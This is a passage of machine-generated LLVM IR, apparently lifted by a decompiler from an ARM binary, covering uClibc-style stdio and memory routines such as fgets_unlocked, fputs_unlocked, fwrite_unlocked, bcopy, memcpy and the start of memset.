  %v1_13ba4 = inttoptr i32 %v0_13bb8 to i32*
  %v2_13ba4 = load i32, i32* %v1_13ba4, align 4
  %v0_13ba8 = load i32, i32* %sl.global-to-local, align 4
  %v2_13ba8 = or i32 %v0_13ba8, %v2_13ba4
  %v1_13bac = xor i32 %v2_13ba8, 320
  store i32 %v1_13bac, i32* %r3.global-to-local, align 4
  %v1_13bb0 = and i32 %v1_13bac, 832
  %v2_13bb0 = icmp eq i32 %v1_13bb0, 0
  store i1 %v2_13bb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13bb0, label %dec_label_pc_13bb8, label %bb39

dec_label_pc_13bb8:                               ; preds = %dec_label_pc_13ba4
  store i32 %v0_13bb8, i32* @r0, align 4
  %v0_13bbc = call i32 @__stdio_wcommit()
  store i32 %v0_13bbc, i32* %r0.global-to-local, align 4
  %v2_13bc0 = icmp eq i32 %v0_13bbc, 0
  store i1 %v2_13bc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13bc0, label %.thread5, label %.thread7

.thread5:                                         ; preds = %dec_label_pc_13bb8
  %v1_13bc4 = load i32, i32* @r6, align 4
  %v2_13bc4 = inttoptr i32 %v1_13bc4 to i32*
  %v3_13bc4 = load i32, i32* %v2_13bc4, align 4
  store i32 %v3_13bc4, i32* %r3.global-to-local, align 4
  %v2_13bc8 = add i32 %v1_13bc4, 8
  %v3_13bc8 = inttoptr i32 %v2_13bc8 to i32*
  %v4_13bc8 = load i32, i32* %v3_13bc8, align 4
  %v2_13bcc = and i32 %v3_13bc4, -65
  store i32 %v2_13bcc, i32* %r3.global-to-local, align 4
  %v4_13bd0 = sdiv i32 %v3_13bc4, 256
  store i32 %v4_13bd0, i32* %r1.global-to-local, align 4
  %v3_13bd4 = add i32 %v1_13bc4, 28
  %v4_13bd4 = inttoptr i32 %v3_13bd4 to i32*
  store i32 %v4_13bc8, i32* %v4_13bd4, align 4
  %v1_13bd8 = load i32, i32* %r1.global-to-local, align 4
  %v2_13bd8 = trunc i32 %v1_13bd8 to i8
  %v3_13bd8 = load i32, i32* @r6, align 4
  %v4_13bd8 = add i32 %v3_13bd8, 1
  %v5_13bd8 = inttoptr i32 %v4_13bd8 to i8*
  store i8 %v2_13bd8, i8* %v5_13bd8, align 1
  %v0_13bdc.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13bdc.pr.pr.pr, label %.thread6, label %.thread7

.thread6:                                         ; preds = %.thread5
  %v1_13bdc = load i32, i32* %r3.global-to-local, align 4
  %v2_13bdc = trunc i32 %v1_13bdc to i8
  %v3_13bdc = load i32, i32* @r6, align 4
  %v4_13bdc = inttoptr i32 %v3_13bdc to i8*
  store i8 %v2_13bdc, i8* %v4_13bdc, align 1
  %v0_13be0.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13be0.pr.pr.pr, label %bb39, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13bb8, %.thread5, %.thread6
  store i32 -1, i32* @r5, align 4
  br label %bb39

bb39:                                             ; preds = %dec_label_pc_13ba4, %.thread6, %.thread7
  %v2_13be8 = load i32, i32* @global_var_2d2dc.1017, align 4
  store i32 %v2_13be8, i32* %r3.global-to-local, align 4
  %v7_13bec = icmp eq i32 %v2_13be8, 2
  store i1 %v7_13bec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13bec, label %.thread11, label %bb40

bb40:                                             ; preds = %bb39
  store i32 %v2_13ab4, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 90076, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 90076)
  br label %.thread11

.thread11:                                        ; preds = %bb39, %dec_label_pc_13b5c, %bb40
  %v0_13c04 = load i32, i32* @r6, align 4
  %v1_13c04 = add i32 %v0_13c04, 32
  %v2_13c04 = inttoptr i32 %v1_13c04 to i32*
  %v3_13c04 = load i32, i32* %v2_13c04, align 4
  store i32 %v3_13c04, i32* @r6, align 4
  %v2_13c08 = icmp eq i32 %v3_13c04, 0
  store i1 %v2_13c08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c08, label %dec_label_pc_13c08.dec_label_pc_13c10_crit_edge, label %dec_label_pc_13b5c

dec_label_pc_13c08.dec_label_pc_13c10_crit_edge:  ; preds = %.thread11
  %v0_13c10.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13c10

dec_label_pc_13c10:                               ; preds = %dec_label_pc_13c08.dec_label_pc_13c10_crit_edge, %dec_label_pc_13acc
  %v0_13c10 = phi i32 [ %v0_13c10.pre, %dec_label_pc_13c08.dec_label_pc_13c10_crit_edge ], [ %v1_13b4c, %dec_label_pc_13acc ]
  %v1_13c10 = call i32 @_stdio_openlist_dec_use(i32 %v0_13c10)
  store i32 %v1_13c10, i32* %r0.global-to-local, align 4
  %v0_13c54.pre = load i32, i32* @r5, align 4
  br label %bb43

dec_label_pc_13c18:                               ; preds = %dec_label_pc_13ac0
  %v1_13c18 = inttoptr i32 %.v1_13aac to i8*
  %v2_13c18 = load i8, i8* %v1_13c18, align 1
  %v3_13c18 = zext i8 %v2_13c18 to i32
  %v1_13c1c = and i32 %v3_13c18, 64
  store i32 %v1_13c1c, i32* %r3.global-to-local, align 4
  %v2_13c1c = icmp eq i32 %v1_13c1c, 0
  store i1 %v2_13c1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c1c, label %bb41, label %dec_label_pc_13c28

bb41:                                             ; preds = %dec_label_pc_13c18
  br label %bb43

dec_label_pc_13c28:                               ; preds = %dec_label_pc_13c18
  %v0_13c28 = call i32 @__stdio_wcommit()
  store i32 %v0_13c28, i32* %r0.global-to-local, align 4
  %v2_13c2c = icmp eq i32 %v0_13c28, 0
  store i1 %v2_13c2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13c2c, label %.thread16, label %bb42

.thread16:                                        ; preds = %dec_label_pc_13c28
  %v1_13c30 = load i32, i32* %r8.global-to-local, align 4
  %v2_13c30 = inttoptr i32 %v1_13c30 to i32*
  %v3_13c30 = load i32, i32* %v2_13c30, align 4
  store i32 %v3_13c30, i32* %r3.global-to-local, align 4
  %v2_13c34 = add i32 %v1_13c30, 8
  %v3_13c34 = inttoptr i32 %v2_13c34 to i32*
  %v4_13c34 = load i32, i32* %v3_13c34, align 4
  store i32 %v4_13c34, i32* %r1.global-to-local, align 4
  %v2_13c38 = and i32 %v3_13c30, -65
  store i32 %v2_13c38, i32* %r3.global-to-local, align 4
  %v4_13c3c = sdiv i32 %v3_13c30, 256
  %v2_13c40 = trunc i32 %v4_13c3c to i8
  %v4_13c40 = add i32 %v1_13c30, 1
  %v5_13c40 = inttoptr i32 %v4_13c40 to i8*
  store i8 %v2_13c40, i8* %v5_13c40, align 1
  %v0_13c44.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13c44.pr.pr.pr, label %.thread18, label %.thread21

.thread18:                                        ; preds = %.thread16
  %v1_13c44 = load i32, i32* %r1.global-to-local, align 4
  %v2_13c44 = load i32, i32* %r8.global-to-local, align 4
  %v3_13c44 = add i32 %v2_13c44, 28
  %v4_13c44 = inttoptr i32 %v3_13c44 to i32*
  store i32 %v1_13c44, i32* %v4_13c44, align 4
  %v1_13c48 = load i32, i32* %r3.global-to-local, align 4
  %v2_13c48 = trunc i32 %v1_13c48 to i8
  %v3_13c48 = load i32, i32* %r8.global-to-local, align 4
  %v4_13c48 = inttoptr i32 %v3_13c48 to i8*
  store i8 %v2_13c48, i8* %v4_13c48, align 1
  %v0_13c4c.pr.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_13c4c.pr.pr.pr, label %.thread20, label %.thread21

.thread21:                                        ; preds = %.thread16, %.thread18
  br label %bb43

bb42:                                             ; preds = %dec_label_pc_13c28
  br label %bb43

.thread20:                                        ; preds = %.thread18
  br label %bb43

bb43:                                             ; preds = %bb41, %bb42, %.thread21, %dec_label_pc_13c10, %.thread20
  %v0_13c54 = phi i32 [ -1, %.thread21 ], [ 0, %bb41 ], [ %v0_13c54.pre, %dec_label_pc_13c10 ], [ -1, %bb42 ], [ 0, %.thread20 ]
  store i32 %v0_13c54, i32* %r0.global-to-local, align 4
  store i32 %v3_13aa0, i32* @r4, align 4
  ret i32 %v0_13c54

; uselistorder directives
  uselistorder i32 %v0_13c54, { 1, 0 }
  uselistorder i32 %v3_13c04, { 1, 2, 0 }
  uselistorder i32 %v2_13ab4, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 5, 9, 4, 10, 1, 6, 0, 7, 8 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 11, 4, 5, 6, 7, 8, 9, 10, 14, 12, 13 }
  uselistorder i32* bitcast (i32** @global_var_2d2a8.1026 to i32*), { 3, 0, 4, 1, 2, 5 }
  uselistorder i32* @global_var_31624.1004, { 1, 4, 2, 0, 5, 3, 6 }
  uselistorder label %bb43, { 4, 1, 2, 0, 3 }
  uselistorder label %.thread21, { 1, 0 }
  uselistorder label %.thread11, { 2, 0, 1 }
  uselistorder label %bb39, { 2, 1, 0 }
  uselistorder label %.thread7, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13ba4, { 1, 0 }
  uselistorder label %dec_label_pc_13b5c, { 1, 0 }
  uselistorder label %dec_label_pc_13acc, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %arg2, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13c88 = icmp eq i32 %arg2, 0
  store i1 %v2_13c88, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r7.global-to-local, align 4
  store i32 %arg3, i32* @r5, align 4
  %tmp14 = icmp slt i32 %arg2, 1
  br i1 %tmp14, label %dec_label_pc_13d10, label %dec_label_pc_13cf4.preheader

dec_label_pc_13cf4.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r4, align 4
  %v1_13cf415 = add i32 %arg2, -1
  store i32 %v1_13cf415, i32* %r6.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_13cf421 = icmp eq i32 %arg2, 1
  store i1 %v7_13cf421, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13cf421, label %dec_label_pc_13d00, label %dec_label_pc_13ca0

dec_label_pc_13ca0:                               ; preds = %dec_label_pc_13cf4.preheader, %dec_label_pc_13cf4.backedge
  %v1_13cf824.in = phi i32 [ %v0_13cf8.pre, %dec_label_pc_13cf4.backedge ], [ %arg3, %dec_label_pc_13cf4.preheader ]
  %v1_13ca0 = add i32 %v1_13cf824.in, 16
  %v2_13ca0 = inttoptr i32 %v1_13ca0 to i32*
  %v3_13ca0 = load i32, i32* %v2_13ca0, align 4
  store i32 %v3_13ca0, i32* %r2.global-to-local, align 4
  %v1_13ca4 = add i32 %v1_13cf824.in, 24
  %v2_13ca4 = inttoptr i32 %v1_13ca4 to i32*
  %v3_13ca4 = load i32, i32* %v2_13ca4, align 4
  %v3_13ca8 = icmp uge i32 %v3_13ca0, %v3_13ca4
  store i1 %v3_13ca8, i1* %cpsr_c.global-to-local, align 1
  %v9_13ca8 = icmp eq i32 %v3_13ca0, %v3_13ca4
  store i1 %v9_13ca8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_13ca8, label %dec_label_pc_13cc8, label %dec_label_pc_13cb0

dec_label_pc_13cb0:                               ; preds = %dec_label_pc_13ca0
  %v1_13cb0 = inttoptr i32 %v3_13ca0 to i8*
  %v2_13cb0 = load i8, i8* %v1_13cb0, align 1
  %v5_13cb0 = add i32 %v3_13ca0, 1
  store i32 %v5_13cb0, i32* %r2.global-to-local, align 4
  %v2_13cb4 = load i32, i32* @r4, align 4
  %v3_13cb4 = inttoptr i32 %v2_13cb4 to i8*
  store i8 %v2_13cb0, i8* %v3_13cb4, align 1
  %v0_13cb8 = load i32, i32* @r4, align 4
  %v1_13cb8 = inttoptr i32 %v0_13cb8 to i8*
  %v2_13cb8 = load i8, i8* %v1_13cb8, align 1
  %v5_13cb8 = add i32 %v0_13cb8, 1
  store i32 %v5_13cb8, i32* @r4, align 4
  %v2_13cbc = icmp ugt i8 %v2_13cb8, 9
  store i1 %v2_13cbc, i1* %cpsr_c.global-to-local, align 1
  %v7_13cbc = icmp eq i8 %v2_13cb8, 10
  store i1 %v7_13cbc, i1* %cpsr_z.global-to-local, align 1
  %v0_13cc0 = load i32, i32* %r2.global-to-local, align 4
  %v1_13cc0 = load i32, i32* @r5, align 4
  %v2_13cc0 = add i32 %v1_13cc0, 16
  %v3_13cc0 = inttoptr i32 %v2_13cc0 to i32*
  store i32 %v0_13cc0, i32* %v3_13cc0, align 4
  br i1 %v7_13cbc, label %dec_label_pc_13d00, label %dec_label_pc_13cf4.backedge

dec_label_pc_13cc8:                               ; preds = %dec_label_pc_13ca0
  %v1_13cf824 = inttoptr i32 %v1_13cf824.in to i8*
  %v3_13cc8 = call i32 @getc_unlocked(i8* %v1_13cf824)
  %v4_13cc8 = trunc i32 %v3_13cc8 to i8
  %v5_13ccc = icmp eq i8 %v4_13cc8, -1
  store i1 %v5_13ccc, i1* %cpsr_c.global-to-local, align 1
  %v10_13ccc = icmp eq i32 %v3_13cc8, -1
  store i1 %v10_13ccc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v5_13ccc, label %dec_label_pc_13cd4, label %dec_label_pc_13cf0

dec_label_pc_13cd4:                               ; preds = %dec_label_pc_13cc8
  %v0_13cd4 = load i32, i32* @r5, align 4
  %v1_13cd4 = inttoptr i32 %v0_13cd4 to i8*
  %v2_13cd4 = load i8, i8* %v1_13cd4, align 1
  %v1_13cd8 = and i8 %v2_13cd4, 8
  %v2_13cd8 = icmp eq i8 %v1_13cd8, 0
  store i1 %v2_13cd8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13cd8, label %dec_label_pc_13d00, label %dec_label_pc_13d10

dec_label_pc_13cf0:                               ; preds = %dec_label_pc_13cc8
  %v3_13ce4 = load i32, i32* @r4, align 4
  %v4_13ce4 = inttoptr i32 %v3_13ce4 to i8*
  store i8 %v4_13cc8, i8* %v4_13ce4, align 1
  %v0_13ce8 = load i32, i32* @r4, align 4
  %v1_13ce8 = inttoptr i32 %v0_13ce8 to i8*
  %v2_13ce8 = load i8, i8* %v1_13ce8, align 1
  %v5_13ce8 = add i32 %v0_13ce8, 1
  store i32 %v5_13ce8, i32* @r4, align 4
  %v2_13cec = icmp ugt i8 %v2_13ce8, 9
  store i1 %v2_13cec, i1* %cpsr_c.global-to-local, align 1
  %v7_13cec = icmp eq i8 %v2_13ce8, 10
  store i1 %v7_13cec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13cec, label %dec_label_pc_13d00, label %dec_label_pc_13cf4.backedge

dec_label_pc_13cf4.backedge:                      ; preds = %dec_label_pc_13cf0, %dec_label_pc_13cb0
  %v0_13cf4.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_13cf8.pre = load i32, i32* @r5, align 4
  %v1_13cf4 = add i32 %v0_13cf4.pre, -1
  store i32 %v1_13cf4, i32* %r6.global-to-local, align 4
  %v2_13cf4 = icmp ne i32 %v0_13cf4.pre, 0
  store i1 %v2_13cf4, i1* %cpsr_c.global-to-local, align 1
  %v7_13cf4 = icmp eq i32 %v0_13cf4.pre, 1
  store i1 %v7_13cf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_13cf4, label %dec_label_pc_13d00, label %dec_label_pc_13ca0

dec_label_pc_13d00:                               ; preds = %dec_label_pc_13cf4.preheader, %dec_label_pc_13cf0, %dec_label_pc_13cf4.backedge, %dec_label_pc_13cb0, %dec_label_pc_13cd4
  %v0_13d00 = load i32, i32* @r4, align 4
  %v1_13d00 = load i32, i32* %r7.global-to-local, align 4
  %v3_13d00 = icmp uge i32 %v0_13d00, %v1_13d00
  store i1 %v3_13d00, i1* %cpsr_c.global-to-local, align 1
  %v9_13d00 = icmp eq i32 %v0_13d00, %v1_13d00
  store i1 %v9_13d00, i1* %cpsr_z.global-to-local, align 1
  %v2_13d04 = xor i1 %v9_13d00, true
  %v3_13d04 = and i1 %v3_13d00, %v2_13d04
  br i1 %v3_13d04, label %bb, label %.thread7

bb:                                               ; preds = %dec_label_pc_13d00
  %v7_13d08 = inttoptr i32 %v0_13d00 to i8*
  store i8 0, i8* %v7_13d08, align 1
  %v0_13d0c.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_13d0c.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_13d00, %bb
  %v1_13d0c = phi i1 [ %v1_13d0c.pre, %bb ], [ %v9_13d00, %dec_label_pc_13d00 ]
  %v0_13d0c = phi i1 [ %v0_13d0c.pre, %bb ], [ %v3_13d00, %dec_label_pc_13d00 ]
  %v2_13d0c = xor i1 %v1_13d0c, true
  %v3_13d0c = and i1 %v0_13d0c, %v2_13d0c
  br i1 %v3_13d0c, label %.dec_label_pc_13d14_crit_edge, label %dec_label_pc_13d10

.dec_label_pc_13d14_crit_edge:                    ; preds = %.thread7
  %v0_13d14.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13d14

dec_label_pc_13d10:                               ; preds = %entry, %dec_label_pc_13cd4, %.thread7
  store i32 0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_13d14

dec_label_pc_13d14:                               ; preds = %.dec_label_pc_13d14_crit_edge, %dec_label_pc_13d10
  %v0_13d14 = phi i32 [ %v0_13d14.pre, %.dec_label_pc_13d14_crit_edge ], [ 0, %dec_label_pc_13d10 ]
  ret i32 %v0_13d14

; uselistorder directives
  uselistorder i1 %v9_13d00, { 1, 0, 2 }
  uselistorder i32 %v1_13d00, { 1, 0 }
  uselistorder i32 %v0_13d00, { 0, 2, 1 }
  uselistorder i32 %v0_13cf4.pre, { 2, 0, 1 }
  uselistorder i1 %v2_13cd8, { 1, 0 }
  uselistorder i32 %v3_13ca0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_13cf824.in, { 2, 1, 0 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 3, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i8 -1, { 1, 2, 3, 4, 0, 5 }
  uselistorder i8 9, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_13d14, { 1, 0 }
  uselistorder label %dec_label_pc_13d10, { 2, 1, 0 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_13d00, { 2, 1, 4, 3, 0 }
  uselistorder label %dec_label_pc_13ca0, { 1, 0 }
}

define i32 @__GI_fputs_unlocked(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_13d1c = load i32, i32* @r4, align 4
  store i32 %v3_13d1c, i32* %stack_var_-16, align 4
  %v6_13d1c = load i32, i32* @r5, align 4
  %v9_13d1c = load i32, i32* @r6, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_13d28 = call i32 @strlen(i8* %arg1)
  store i32 %v3_13d28, i32* @r6, align 4
  %v0_13d30 = load i32, i32* @r5, align 4
  %v0_13d34 = load i32, i32* @r4, align 4
  %v5_13d40 = inttoptr i32 %v0_13d30 to i8*
  %v6_13d40 = call i32 @__GI_fwrite_unlocked(i32 %v0_13d34, i32 1, i32 %v3_13d28, i8* %v5_13d40)
  %v1_13d44 = load i32, i32* @r6, align 4
  %v9_13d44 = icmp eq i32 %v6_13d40, %v1_13d44
  br i1 %v9_13d44, label %bb7, label %bb

bb:                                               ; preds = %entry
  br label %bb7

bb7:                                              ; preds = %entry, %bb
  %v14_13d4c = phi i32 [ %v6_13d40, %entry ], [ -1, %bb ]
  %v2_13d4c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13d4c, i32* @r4, align 4
  store i32 %v6_13d1c, i32* @r5, align 4
  store i32 %v9_13d1c, i32* @r6, align 4
  ret i32 %v14_13d4c

; uselistorder directives
  uselistorder label %bb7, { 1, 0 }
}

define i32 @__GI_fwrite_unlocked(i32 %arg1, i32 %arg2, i32 %arg3, i8* %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v9_13d50 = load i32, i32* @r6, align 4
  %v12_13d50 = load i32, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  %v3_13d58 = load i8, i8* %arg4, align 1
  %v4_13d58 = zext i8 %v3_13d58 to i32
  %v1_13d5c = and i32 %v4_13d58, 192
  store i32 %v1_13d5c, i32* %r3.global-to-local, align 4
  %v2_13d60 = icmp eq i32 %v1_13d5c, 192
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg3, i32* @r6, align 4
  br i1 %v2_13d60, label %dec_label_pc_13d88, label %dec_label_pc_13d7c

dec_label_pc_13d7c:                               ; preds = %entry
  %v4_13d7c = call i32 @__stdio_trans2w_o(i8* nonnull %arg4, i32 128)
  %v2_13d80 = icmp eq i32 %v4_13d7c, 0
  br i1 %v2_13d80, label %dec_label_pc_13d7c.dec_label_pc_13d88_crit_edge, label %dec_label_pc_13df0

dec_label_pc_13d7c.dec_label_pc_13d88_crit_edge:  ; preds = %dec_label_pc_13d7c
  %v0_13d88.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13d88

dec_label_pc_13d88:                               ; preds = %dec_label_pc_13d7c.dec_label_pc_13d88_crit_edge, %entry
  %v0_13d901 = phi i32 [ %v0_13d88.pre, %dec_label_pc_13d7c.dec_label_pc_13d88_crit_edge ], [ %arg2, %entry ]
  %v2_13d88 = icmp eq i32 %v0_13d901, 0
  br i1 %v2_13d88, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_13d88
  br label %dec_label_pc_13df0

bb:                                               ; preds = %dec_label_pc_13d88
  %v1_13d8c = load i32, i32* @r6, align 4
  %v3_13d8c = icmp eq i32 %v1_13d8c, 0
  br i1 %v3_13d8c, label %dec_label_pc_13df0, label %dec_label_pc_13d9c

dec_label_pc_13d9c:                               ; preds = %bb
  %v2_13d9c = udiv i32 -1, %v0_13d901
  %v0_13da4 = load i32, i32* @r4, align 4
  store i32 %v0_13da4, i32* %r2.global-to-local, align 4
  %tmp10 = icmp ugt i32 %v1_13d8c, %v2_13d9c
  br i1 %tmp10, label %dec_label_pc_13dc8, label %dec_label_pc_13db0

dec_label_pc_13db0:                               ; preds = %dec_label_pc_13d9c
  %v0_13da8 = load i32, i32* @r7, align 4
  %v2_13db0 = mul i32 %v1_13d8c, %v0_13d901
  %v4_13db4 = call i32 @__stdio_fwrite(i32 %v0_13da8, i32 %v2_13db0, i32 %v0_13da4)
  %v0_13db8 = load i32, i32* @r5, align 4
  %v2_13dbc = udiv i32 %v4_13db4, %v0_13db8
  store i32 %v2_13dbc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13df4

dec_label_pc_13dc8:                               ; preds = %dec_label_pc_13d9c
  %v1_13dc8 = inttoptr i32 %v0_13da4 to i32*
  %v2_13dc8 = load i32, i32* %v1_13dc8, align 4
  %v1_13dcc = or i32 %v2_13dc8, 8
  store i32 %v1_13dcc, i32* %r3.global-to-local, align 4
  %v3_13dd0 = sdiv i32 %v2_13dc8, 256
  store i32 %v3_13dd0, i32* %r2.global-to-local, align 4
  %v1_13dd4 = trunc i32 %v3_13dd0 to i8
  %v3_13dd4 = add i32 %v0_13da4, 1
  %v4_13dd4 = inttoptr i32 %v3_13dd4 to i8*
  store i8 %v1_13dd4, i8* %v4_13dd4, align 1
  %v0_13dd8 = load i32, i32* %r3.global-to-local, align 4
  %v1_13dd8 = trunc i32 %v0_13dd8 to i8
  %v2_13dd8 = load i32, i32* @r4, align 4
  %v3_13dd8 = inttoptr i32 %v2_13dd8 to i8*
  store i8 %v1_13dd8, i8* %v3_13dd8, align 1
  %v0_13ddc = call i32 @__errno_location()
  store i32 22, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_13de8 = inttoptr i32 %v0_13ddc to i32*
  store i32 22, i32* %v2_13de8, align 4
  %v0_13df4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13df4

dec_label_pc_13df0:                               ; preds = %.thread, %dec_label_pc_13d7c, %bb
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13df4

dec_label_pc_13df4:                               ; preds = %dec_label_pc_13dc8, %dec_label_pc_13db0, %dec_label_pc_13df0
  %v0_13df4 = phi i32 [ %v0_13df4.pre, %dec_label_pc_13dc8 ], [ %v2_13dbc, %dec_label_pc_13db0 ], [ 0, %dec_label_pc_13df0 ]
  store i32 %v9_13d50, i32* @r6, align 4
  store i32 %v12_13d50, i32* @r7, align 4
  ret i32 %v0_13df4

; uselistorder directives
  uselistorder i32 %v3_13dd0, { 1, 0 }
  uselistorder i32 %v1_13d8c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder i32 (i32, i32, i32)* @__stdio_fwrite, { 3, 2, 0, 1 }
  uselistorder i32 (i8*, i32)* @__stdio_trans2w_o, { 1, 0 }
  uselistorder label %dec_label_pc_13df4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13df0, { 2, 0, 1 }
}

define i32 @bcopy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v2_13e0c = inttoptr i32 %arg2 to i8*
  %v3_13e0c = call i32 @_memcpy(i8* %v2_13e0c, i32 %arg1)
  ret i32 %v3_13e0c
}

define i32 @memcpy() local_unnamed_addr {
entry:
  %v0_13e10 = load i32, i32* @r0, align 4
  %v1_13e10 = load i32, i32* @r1, align 4
  %v2_13e10 = inttoptr i32 %v0_13e10 to i8*
  %v3_13e10 = call i32 @_memcpy(i8* %v2_13e10, i32 %v1_13e10)
  ret i32 %v3_13e10
}

define i32 @__GI_memset(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_13e24 = load i32, i32* @r2, align 4
  %v8_13e24 = icmp eq i32 %v0_13e24, 8
  store i1 %v8_13e24, i1* %cpsr_z.global-to-local, align 1
  %v5_13e28 = icmp slt i32 %v0_13e24, 8
  br i1 %v5_13e28, label %dec_label_pc_13e88, label %dec_label_pc_13e2c

dec_label_pc_13e2c:                               ; preds = %entry
  %v4_13e2c = mul i32 %arg2, 256
  %v5_13e2c = or i32 %v4_13e2c, %arg2
  %v4_13e30 = mul i32 %v5_13e2c, 65536
  %v5_13e30 = or i32 %v4_13e30, %v5_13e2c
  store i32 %v5_13e30, i32* %r1.global-to-local, align 4
  %v1_13e3457 = urem i32 %tmp, 4
  %v2_13e3458 = icmp eq i32 %v1_13e3457, 0
  store i1 %v2_13e3458, i1* %cpsr_z.global-to-local, align 1
  %extract.t83 = trunc i32 %arg2 to i8
  br i1 %v2_13e3458, label %dec_label_pc_13e44, label %bb

bb:                                               ; preds = %dec_label_pc_13e2c, %.thread.bb_crit_edge
  %arg2.sink.off0 = phi i8 [ %extract.t82, %.thread.bb_crit_edge ], [ %extract.t83, %dec_label_pc_13e2c ]
  %v3_13e3859 = phi i32 [ %v6_13e38, %.thread.bb_crit_edge ], [ %tmp, %dec_label_pc_13e2c ]
  %v4_13e38 = inttoptr i32 %v3_13e3859 to i8*
  store i8 %arg2.sink.off0, i8* %v4_13e38, align 1
  %v5_13e38 = load i32, i32* %r3.global-to-local, align 4
  %v6_13e38 = add i32 %v5_13e38, 1
  store i32 %v6_13e38, i32* %r3.global-to-local, align 4
  %v0_13e3c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  %v0_13e48.pr.pre = load i32, i32* @r2, align 4
  br i1 %v0_13e3c.pr, label %dec_label_pc_13e44, label %.thread

.thread:                                          ; preds = %bb
  %v2_13e3c = add i32 %v0_13e48.pr.pre, -1
  store i32 %v2_13e3c, i32* @r2, align 4
  %v1_13e34 = urem i32 %v6_13e38, 4
  %v2_13e34 = icmp eq i32 %v1_13e34, 0
  store i1 %v2_13e34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13e34, label %dec_label_pc_13e44, label %.thread.bb_crit_edge

